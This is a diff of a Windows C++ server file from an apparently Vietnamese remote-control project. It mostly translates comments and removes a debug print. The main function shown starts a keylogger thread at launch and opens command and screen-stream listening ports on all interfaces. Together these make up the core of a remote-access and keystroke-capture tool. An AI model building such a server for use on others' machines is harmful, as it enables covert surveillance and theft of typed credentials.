@@ -1,4 +1,3 @@
-// server.cpp (PHIEN BAN HYBRID - HOAN CHINH)
 #define _CRT_SECURE_NO_WARNINGS
 
 #include <winsock2.h>
@@ -22,7 +21,7 @@
 #pragma comment(lib, "Shell32.lib")
 #pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "Shlwapi.lib")
-#pragma comment(lib, "Ole32.lib") // Quan trong cho ScreenController
+#pragma comment(lib, "Ole32.lib")
 
 using namespace Gdiplus;
 using namespace std;
@@ -30,7 +29,7 @@ using namespace std;
 const int CMD_PORT = 9000;
 const int STREAM_PORT = 9001;
 
-// Ham helper de lay IP
+// Hàm lấy IP
 string getClientIp(sockaddr_in client_addr)
 {
     char ip[INET_ADDRSTRLEN];
@@ -38,7 +37,7 @@ string getClientIp(sockaddr_in client_addr)
     return string(ip);
 }
 
-// Ham lang nghe cong stream (chay trong luong rieng)
+// Hàm lắng nghe cổng Stream
 void streamAcceptLoop(CommandRouter *router, SOCKET streamListenSocket)
 {
     while (true)
@@ -49,18 +48,16 @@ void streamAcceptLoop(CommandRouter *router, SOCKET streamListenSocket)
         if (streamClient == INVALID_SOCKET)
             continue;
 
-        // Moi ket noi stream -> 1 luong moi (detach)
+        // Mỗi kết nối stream -> Một luồng mới
         string ip = getClientIp(client_addr);
         std::thread(&CommandRouter::handleStreamClient, router, streamClient, ip).detach();
     }
 }
 
-// === HAM MAIN MOI ===
+// Hàm main
 int main()
 {
     SetConsoleOutputCP(65001);
-    std::cout << "\n\n!!! PHIEN BAN MOI DA DUOC NAP (FIX JSON) !!!\n\n"
-              << std::endl;
     srand((unsigned int)time(0));
 
     GdiplusStartupInput g;
@@ -69,18 +66,18 @@ int main()
     WSADATA w;
     WSAStartup(MAKEWORD(2, 2), &w);
 
-    // Khoi dong cac dich vu nen
+    // Khởi động các dịch vụ nền
     KeylogController::startKeyLoggerThread();
     std::thread(DeviceController::buildDeviceListJson).detach();
 
-    // === 1. Thiet lap Cong Lenh (9000) ===
+    // Thiết lập cổng lệnh - 9000
     SOCKET cmdListenSocket = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in cmdAddr = {AF_INET, htons(CMD_PORT)};
     cmdAddr.sin_addr.s_addr = INADDR_ANY;
     bind(cmdListenSocket, (sockaddr *)&cmdAddr, sizeof(cmdAddr));
     listen(cmdListenSocket, SOMAXCONN);
 
-    // === 2. Thiet lap Cong Stream (9001) ===
+    // Thiết lập cổng stream - 9001
     SOCKET streamListenSocket = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in streamAddr = {AF_INET, htons(STREAM_PORT)};
     streamAddr.sin_addr.s_addr = INADDR_ANY;
